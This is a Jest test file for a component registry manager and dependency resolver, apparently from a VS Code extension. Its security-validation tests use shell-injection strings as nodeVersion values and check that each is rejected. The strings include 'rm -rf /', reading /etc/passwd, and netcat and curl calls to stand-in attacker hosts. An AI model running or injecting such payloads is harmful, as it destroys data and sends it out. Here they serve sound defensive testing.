import { ComponentRegistryManager, DependencyResolver } from '@/features/components/services/ComponentRegistryManager';
import type {
    RawComponentRegistry,
    ComponentRegistry,
    TransformedComponentDefinition,
    ComponentDefinition,
} from '@/types';
import * as path from 'path';

/**
 * ComponentRegistryManager Test Suite
 *
 * Tests component registry loading, transformation, and lookup operations:
 * - Registry loading and caching
 * - Component transformation (raw → grouped structure)
 * - Component lookup by ID and category
 * - Node version resolution
 * - Dependency resolution
 * - Validation of dependency chains
 * - Project configuration generation
 *
 * Total tests: 25
 */

// Mock ConfigurationLoader
jest.mock('@/core/config/ConfigurationLoader', () => {
    return {
        ConfigurationLoader: jest.fn().mockImplementation(() => {
            return {
                load: jest.fn(),
            };
        }),
    };
});

// Mock vscode for generateConfiguration test
jest.mock('vscode', () => ({
    workspace: {
        getConfiguration: jest.fn(() => ({
            get: jest.fn((key: string, defaultValue: number) => defaultValue),
        })),
    },
}), { virtual: true });

// Sample raw registry data
const mockRawRegistry: RawComponentRegistry = {
    version: '2.0',
    selectionGroups: {
        frontends: ['frontend1', 'frontend2'],
        backends: ['backend1'],
        dependencies: ['dep1'],
        integrations: ['integration1'],
        appBuilderApps: ['app1'],
    },
    components: {
        frontend1: {
            id: 'frontend1',
            name: 'Frontend 1',
            description: 'Test Frontend',
            type: 'frontend',
            compatibleBackends: ['backend1'],
            source: {
                type: 'git',
                url: 'https://github.com/test/frontend1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '20',
                port: 3000,
                envVars: {
                    requiredEnvVars: ['VAR1', 'VAR2'],
                    optionalEnvVars: [],
                },
            },
            dependencies: {
                required: ['dep1'],
                optional: [],
            },
        },
        frontend2: {
            id: 'frontend2',
            name: 'Frontend 2',
            description: 'Second Frontend',
            type: 'frontend',
            source: {
                type: 'git',
                url: 'https://github.com/test/frontend2',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '18',
            },
        },
        backend1: {
            id: 'backend1',
            name: 'Backend 1',
            description: 'Test Backend',
            type: 'backend',
            source: {
                type: 'git',
                url: 'https://github.com/test/backend1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '20',
            },
        },
        dep1: {
            id: 'dep1',
            name: 'Dependency 1',
            description: 'Test Dependency',
            type: 'dependency',
            source: {
                type: 'git',
                url: 'https://github.com/test/dep1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '18',
            },
        },
        integration1: {
            id: 'integration1',
            name: 'Integration 1',
            description: 'Test Integration',
            type: 'external-system',
            source: {
                type: 'git',
                url: 'https://github.com/test/integration1',
                version: '1.0.0',
            },
        },
        app1: {
            id: 'app1',
            name: 'App Builder App',
            description: 'Test App',
            type: 'app-builder',
            source: {
                type: 'git',
                url: 'https://github.com/test/app1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '22',
            },
        },
    },
    infrastructure: {
        infra1: {
            id: 'infra1',
            name: 'Infrastructure 1',
            description: 'Test Infrastructure',
            type: 'external-system',
            source: {
                type: 'git',
                url: 'https://github.com/test/infra1',
                version: '1.0.0',
            },
            configuration: {
                nodeVersion: '20',
            },
        },
    },
    services: {
        service1: {
            id: 'service1',
            name: 'Service 1',
            description: 'Test Service',
            requiredEnvVars: ['SERVICE_VAR1'],
        },
    },
    envVars: {
        VAR1: {
            type: 'text',
            label: 'Variable 1',
            description: 'Variable 1',
            required: true,
        },
        VAR2: {
            type: 'text',
            label: 'Variable 2',
            description: 'Variable 2',
            required: false,
        },
        SERVICE_VAR1: {
            type: 'text',
            label: 'Service Variable 1',
            description: 'Service Variable 1',
            required: true,
        },
    },
};

describe('ComponentRegistryManager', () => {
    let manager: ComponentRegistryManager;
    let mockLoader: any;

    beforeEach(() => {
        jest.clearAllMocks();

        // Create manager instance (triggers constructor)
        manager = new ComponentRegistryManager('/fake/extension/path');

        // Get the mock loader instance
        const { ConfigurationLoader } = require('@/core/config/ConfigurationLoader');
        mockLoader = ConfigurationLoader.mock.results[0]?.value;
    });

    describe('registry loading', () => {
        it('should load and cache registry on first call', async () => {
            mockLoader.load.mockResolvedValue(mockRawRegistry);

            const registry = await manager.loadRegistry();

            expect(mockLoader.load).toHaveBeenCalledTimes(1);
            expect(registry).toBeDefined();
            expect(registry.version).toBe('2.0');
        });

        it('should return cached registry on subsequent calls', async () => {
            mockLoader.load.mockResolvedValue(mockRawRegistry);

            await manager.loadRegistry();
            await manager.loadRegistry();
            await manager.loadRegistry();

            expect(mockLoader.load).toHaveBeenCalledTimes(1);
        });

        it('should transform raw registry to grouped structure', async () => {
            mockLoader.load.mockResolvedValue(mockRawRegistry);

            const registry = await manager.loadRegistry();

            expect(registry.components).toBeDefined();
            expect(registry.components.frontends).toHaveLength(2);
            expect(registry.components.backends).toHaveLength(1);
            expect(registry.components.dependencies).toHaveLength(1);
            expect(registry.components.integrations).toHaveLength(1);
            expect(registry.components.appBuilder).toHaveLength(1);
        });

        it('should include infrastructure components', async () => {
            mockLoader.load.mockResolvedValue(mockRawRegistry);

            const registry = await manager.loadRegistry();

            expect(registry.infrastructure).toHaveLength(1);
            expect(registry.infrastructure![0].id).toBe('infra1');
            expect(registry.infrastructure![0].name).toBe('Infrastructure 1');
        });

        it('should build env vars for components', async () => {
            mockLoader.load.mockResolvedValue(mockRawRegistry);

            const registry = await manager.loadRegistry();
            const frontend = registry.components.frontends[0];

            expect(frontend.configuration?.envVars).toBeDefined();
            expect(frontend.configuration?.envVars).toHaveLength(2);
            expect(frontend.configuration?.envVars?.[0].key).toBe('VAR1');
        });
    });

    describe('component retrieval by category', () => {
        beforeEach(() => {
            mockLoader.load.mockResolvedValue(mockRawRegistry);
        });

        it('should return frontends', async () => {
            const frontends = await manager.getFrontends();

            expect(frontends).toHaveLength(2);
            expect(frontends[0].id).toBe('frontend1');
            expect(frontends[1].id).toBe('frontend2');
        });

        it('should return backends', async () => {
            const backends = await manager.getBackends();

            expect(backends).toHaveLength(1);
            expect(backends[0].id).toBe('backend1');
        });

        it('should return dependencies', async () => {
            const dependencies = await manager.getDependencies();

            expect(dependencies).toHaveLength(1);
            expect(dependencies[0].id).toBe('dep1');
        });

        it('should return integrations', async () => {
            const integrations = await manager.getIntegrations();

            expect(integrations).toHaveLength(1);
            expect(integrations[0].id).toBe('integration1');
        });

        it('should return app builder components', async () => {
            const appBuilder = await manager.getAppBuilder();

            expect(appBuilder).toHaveLength(1);
            expect(appBuilder[0].id).toBe('app1');
        });

        it('should return empty array for missing integrations', async () => {
            mockLoader.load.mockResolvedValue({
                ...mockRawRegistry,
                selectionGroups: {
                    ...mockRawRegistry.selectionGroups,
                    integrations: undefined,
                },
            });

            const integrations = await manager.getIntegrations();

            expect(integrations).toEqual([]);
        });
    });

    describe('component lookup by ID', () => {
        beforeEach(() => {
            mockLoader.load.mockResolvedValue(mockRawRegistry);
        });

        it('should find frontend by ID', async () => {
            const component = await manager.getComponentById('frontend1');

            expect(component).toBeDefined();
            expect(component?.id).toBe('frontend1');
            expect(component?.name).toBe('Frontend 1');
        });

        it('should find backend by ID', async () => {
            const component = await manager.getComponentById('backend1');

            expect(component).toBeDefined();
            expect(component?.id).toBe('backend1');
        });

        it('should find dependency by ID', async () => {
            const component = await manager.getComponentById('dep1');

            expect(component).toBeDefined();
            expect(component?.id).toBe('dep1');
        });

        it('should return undefined for non-existent component', async () => {
            const component = await manager.getComponentById('nonexistent');

            expect(component).toBeUndefined();
        });
    });

    describe('node version resolution', () => {
        beforeEach(() => {
            mockLoader.load.mockResolvedValue(mockRawRegistry);
        });

        it('should resolve node versions from frontend and backend', async () => {
            const versions = await manager.getRequiredNodeVersions('frontend1', 'backend1');

            expect(versions.size).toBe(1);
            expect(versions.has('20')).toBe(true);
        });

        it('should include dependency node versions', async () => {
            const versions = await manager.getRequiredNodeVersions('frontend1', 'backend1', ['dep1']);

            expect(versions.size).toBe(2);
            expect(versions.has('20')).toBe(true);
            expect(versions.has('18')).toBe(true);
        });

        it('should include app builder node versions', async () => {
            const versions = await manager.getRequiredNodeVersions(
                'frontend1',
                'backend1',
                undefined,
                undefined,
                ['app1']
            );

            expect(versions.size).toBe(2);
            expect(versions.has('20')).toBe(true);
            expect(versions.has('22')).toBe(true);
        });

        it('should return empty set when no components specified', async () => {
            const versions = await manager.getRequiredNodeVersions();

            expect(versions.size).toBe(0);
        });

        it('should handle components without node version', async () => {
            mockLoader.load.mockResolvedValue({
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    frontend1: {
                        ...mockRawRegistry.components!.frontend1,
                        configuration: {},
                    },
                },
            });

            const versions = await manager.getRequiredNodeVersions('frontend1');

            expect(versions.size).toBe(0);
        });
    });

    describe('compatibility checking', () => {
        beforeEach(() => {
            mockLoader.load.mockResolvedValue(mockRawRegistry);
        });

        it('should return true for compatible frontend and backend', async () => {
            const isCompatible = await manager.checkCompatibility('frontend1', 'backend1');

            expect(isCompatible).toBe(true);
        });

        it('should return false for incompatible frontend and backend', async () => {
            const isCompatible = await manager.checkCompatibility('frontend1', 'nonexistent');

            expect(isCompatible).toBe(false);
        });

        it('should return false when frontend not found', async () => {
            const isCompatible = await manager.checkCompatibility('nonexistent', 'backend1');

            expect(isCompatible).toBe(false);
        });

        it('should return false when frontend has no compatibleBackends', async () => {
            const isCompatible = await manager.checkCompatibility('frontend2', 'backend1');

            expect(isCompatible).toBe(false);
        });
    });
});

describe('ComponentRegistryManager - nodeVersion security validation', () => {
    let manager: ComponentRegistryManager;
    let mockLoader: any;

    beforeEach(() => {
        jest.clearAllMocks();
        manager = new ComponentRegistryManager('/fake/extension/path');
        const { ConfigurationLoader } = require('@/core/config/ConfigurationLoader');
        mockLoader = ConfigurationLoader.mock.results[0]?.value;
    });

    describe('getRequiredNodeVersions - security validation', () => {
        it('should accept valid numeric versions from components.json', async () => {
            // Given: components.json has valid numeric versions ("20", "22", "24")
            mockLoader.load.mockResolvedValue(mockRawRegistry);

            // When: getRequiredNodeVersions() is called
            const versions = await manager.getRequiredNodeVersions(
                'frontend1',  // Node 20
                'backend1',   // Node 20
                ['dep1'],     // Node 18
                undefined,
                ['app1']      // Node 22
            );

            // Then: All versions returned without error
            expect(versions.size).toBeGreaterThan(0);
            expect(versions.has('20')).toBe(true);
            expect(versions.has('18')).toBe(true);
            expect(versions.has('22')).toBe(true);
        });

        it('should accept valid semantic versions', async () => {
            // Given: Component with semantic version
            const registryWithSemver = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    frontend1: {
                        ...mockRawRegistry.components!.frontend1,
                        configuration: {
                            ...mockRawRegistry.components!.frontend1.configuration,
                            nodeVersion: '20.11.0'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(registryWithSemver);

            // When: getRequiredNodeVersions() is called
            const versions = await manager.getRequiredNodeVersions('frontend1');

            // Then: Semantic version accepted
            expect(versions.has('20.11.0')).toBe(true);
        });

        it('should throw error for injection payload in nodeVersion', async () => {
            // Given: components.json manually edited with malicious version
            const maliciousRegistry = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    frontend1: {
                        ...mockRawRegistry.components!.frontend1,
                        configuration: {
                            ...mockRawRegistry.components!.frontend1.configuration,
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions('frontend1')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should throw error for invalid version format with v prefix', async () => {
            // Given: Component with "v" prefix (invalid)
            const invalidRegistry = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    frontend1: {
                        ...mockRawRegistry.components!.frontend1,
                        configuration: {
                            ...mockRawRegistry.components!.frontend1.configuration,
                            nodeVersion: 'v20'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(invalidRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions('frontend1')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should throw error for invalid version format "latest"', async () => {
            // Given: Component with "latest" keyword (invalid - not in allowlist)
            const invalidRegistry = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    frontend1: {
                        ...mockRawRegistry.components!.frontend1,
                        configuration: {
                            ...mockRawRegistry.components!.frontend1.configuration,
                            nodeVersion: 'latest'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(invalidRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions('frontend1')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate all 9 injection payloads', async () => {
            // Given: All known injection payloads from security agent
            const injectionPayloads = [
                '20; rm -rf /',
                '20 && cat /etc/passwd',
                '20 | nc attacker.com 1234',
                '20`whoami`',
                '20$(id)',
                "20' OR '1'='1",
                '20\nrm -rf /',
                '20;$(curl evil.com)',
                '20 & curl http://evil.com',
            ];

            // When & Then: Each payload rejected
            for (const payload of injectionPayloads) {
                const maliciousRegistry = {
                    ...mockRawRegistry,
                    components: {
                        ...mockRawRegistry.components!,
                        frontend1: {
                            ...mockRawRegistry.components!.frontend1,
                            configuration: {
                                ...mockRawRegistry.components!.frontend1.configuration,
                                nodeVersion: payload
                            }
                        }
                    }
                };
                mockLoader.load.mockResolvedValue(maliciousRegistry);

                await expect(
                    manager.getRequiredNodeVersions('frontend1')
                ).rejects.toThrow(/Invalid Node/);
            }
        });

        it('should validate nodeVersion in backend component', async () => {
            // Given: Backend with malicious version
            const maliciousRegistry = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    backend1: {
                        ...mockRawRegistry.components!.backend1,
                        configuration: {
                            ...mockRawRegistry.components!.backend1.configuration,
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions(undefined, 'backend1')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate nodeVersion in dependencies', async () => {
            // Given: Dependency with malicious version
            const maliciousRegistry = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    dep1: {
                        ...mockRawRegistry.components!.dep1,
                        configuration: {
                            ...mockRawRegistry.components!.dep1.configuration,
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions(undefined, undefined, ['dep1'])
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate nodeVersion in app builder components', async () => {
            // Given: App Builder with malicious version
            const maliciousRegistry = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    app1: {
                        ...mockRawRegistry.components!.app1,
                        configuration: {
                            ...mockRawRegistry.components!.app1.configuration,
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getRequiredNodeVersions(undefined, undefined, undefined, undefined, ['app1'])
            ).rejects.toThrow(/Invalid Node/);
        });
    });

    describe('getNodeVersionToComponentMapping - security validation', () => {
        it('should validate versions in infrastructure components', async () => {
            // Given: Infrastructure with malicious version
            const maliciousRegistry = {
                ...mockRawRegistry,
                infrastructure: {
                    infra1: {
                        ...mockRawRegistry.infrastructure!.infra1,
                        configuration: {
                            ...mockRawRegistry.infrastructure!.infra1.configuration,
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getNodeVersionToComponentMapping()
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate versions in frontend mapping', async () => {
            // Given: Frontend with malicious version
            const maliciousRegistry = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    frontend1: {
                        ...mockRawRegistry.components!.frontend1,
                        configuration: {
                            ...mockRawRegistry.components!.frontend1.configuration,
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getNodeVersionToComponentMapping('frontend1')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate versions in backend mapping', async () => {
            // Given: Backend with malicious version
            const maliciousRegistry = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    backend1: {
                        ...mockRawRegistry.components!.backend1,
                        configuration: {
                            ...mockRawRegistry.components!.backend1.configuration,
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getNodeVersionToComponentMapping(undefined, 'backend1')
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate versions in dependencies mapping', async () => {
            // Given: Dependency with malicious version
            const maliciousRegistry = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    dep1: {
                        ...mockRawRegistry.components!.dep1,
                        configuration: {
                            ...mockRawRegistry.components!.dep1.configuration,
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getNodeVersionToComponentMapping(undefined, undefined, ['dep1'])
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should validate versions in app builder mapping', async () => {
            // Given: App Builder with malicious version
            const maliciousRegistry = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    app1: {
                        ...mockRawRegistry.components!.app1,
                        configuration: {
                            ...mockRawRegistry.components!.app1.configuration,
                            nodeVersion: '20; rm -rf /'
                        }
                    }
                }
            };
            mockLoader.load.mockResolvedValue(maliciousRegistry);

            // When & Then: Validation error thrown
            await expect(
                manager.getNodeVersionToComponentMapping(undefined, undefined, undefined, undefined, ['app1'])
            ).rejects.toThrow(/Invalid Node/);
        });

        it('should accept valid versions in mapping', async () => {
            // Given: Registry with valid versions
            mockLoader.load.mockResolvedValue(mockRawRegistry);

            // When: getNodeVersionToComponentMapping() is called
            const mapping = await manager.getNodeVersionToComponentMapping(
                'frontend1',
                'backend1',
                ['dep1'],
                undefined,
                ['app1']
            );

            // Then: Mapping returned without errors
            expect(Object.keys(mapping).length).toBeGreaterThan(0);
            expect(mapping['20']).toBeDefined();
            expect(mapping['18']).toBeDefined();
            expect(mapping['22']).toBeDefined();
        });
    });
});

describe('DependencyResolver', () => {
    let manager: ComponentRegistryManager;
    let resolver: DependencyResolver;
    let mockLoader: any;

    beforeEach(() => {
        jest.clearAllMocks();

        manager = new ComponentRegistryManager('/fake/extension/path');
        resolver = new DependencyResolver(manager);

        const { ConfigurationLoader } = require('@/core/config/ConfigurationLoader');
        mockLoader = ConfigurationLoader.mock.results[0]?.value;
        mockLoader.load.mockResolvedValue(mockRawRegistry);
    });

    describe('dependency resolution', () => {
        it('should resolve required dependencies', async () => {
            const result = await resolver.resolveDependencies('frontend1', 'backend1');

            expect(result.required).toHaveLength(1);
            expect(result.required[0].id).toBe('dep1');
        });

        it('should resolve optional dependencies when selected', async () => {
            const registryWithOptional = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    frontend1: {
                        ...mockRawRegistry.components!.frontend1,
                        dependencies: {
                            required: ['dep1'],
                            optional: ['integration1'],
                        },
                    },
                },
            };
            mockLoader.load.mockResolvedValue(registryWithOptional);

            const result = await resolver.resolveDependencies('frontend1', 'backend1', ['integration1']);

            expect(result.optional).toHaveLength(1);
            expect(result.selected).toHaveLength(1);
            expect(result.selected[0].id).toBe('integration1');
        });

        it('should combine required and selected in all array', async () => {
            const result = await resolver.resolveDependencies('frontend1', 'backend1');

            expect(result.all).toHaveLength(1);
            expect(result.all[0].id).toBe('dep1');
        });

        it('should throw error for invalid frontend', async () => {
            await expect(
                resolver.resolveDependencies('nonexistent', 'backend1')
            ).rejects.toThrow('Invalid frontend or backend selection');
        });

        it('should throw error for invalid backend', async () => {
            await expect(
                resolver.resolveDependencies('frontend1', 'nonexistent')
            ).rejects.toThrow('Invalid frontend or backend selection');
        });
    });

    describe('dependency validation', () => {
        it('should validate dependency chain without errors', async () => {
            const deps = [
                {
                    id: 'dep1',
                    name: 'Dependency 1',
                    type: 'dependency' as const,
                    source: { type: 'git' as const, url: 'url', version: '1.0.0' },
                },
            ];

            const result = await resolver.validateDependencyChain(deps);

            expect(result.valid).toBe(true);
            expect(result.errors).toHaveLength(0);
        });

        it('should detect circular dependencies', async () => {
            const registryWithCircular = {
                ...mockRawRegistry,
                components: {
                    ...mockRawRegistry.components!,
                    dep1: {
                        ...mockRawRegistry.components!.dep1,
                        dependencies: {
                            required: ['dep1'], // Self-reference
                            optional: [],
                        },
                    },
                },
            };
            mockLoader.load.mockResolvedValue(registryWithCircular);

            const deps = [
                {
                    id: 'dep1',
                    name: 'Dependency 1',
                    type: 'dependency' as const,
                    source: { type: 'git' as const, url: 'url', version: '1.0.0' },
                    dependencies: {
                        required: ['dep1'],
                        optional: [],
                    },
                },
            ];

            const result = await resolver.validateDependencyChain(deps);

            expect(result.valid).toBe(false);
            expect(result.errors.length).toBeGreaterThan(0);
            expect(result.errors[0]).toContain('Circular dependency');
        });

        it('should warn about version conflicts', async () => {
            const deps = [
                {
                    id: 'dep1',
                    name: 'Dependency 1',
                    type: 'dependency' as const,
                    source: { type: 'git' as const, url: 'url', version: '1.0.0' },
                },
                {
                    id: 'dep1',
                    name: 'Dependency 1',
                    type: 'dependency' as const,
                    source: { type: 'git' as const, url: 'url', version: '2.0.0' },
                },
            ];

            const result = await resolver.validateDependencyChain(deps);

            expect(result.warnings.length).toBeGreaterThan(0);
            expect(result.warnings[0]).toContain('Multiple versions');
        });
    });
});
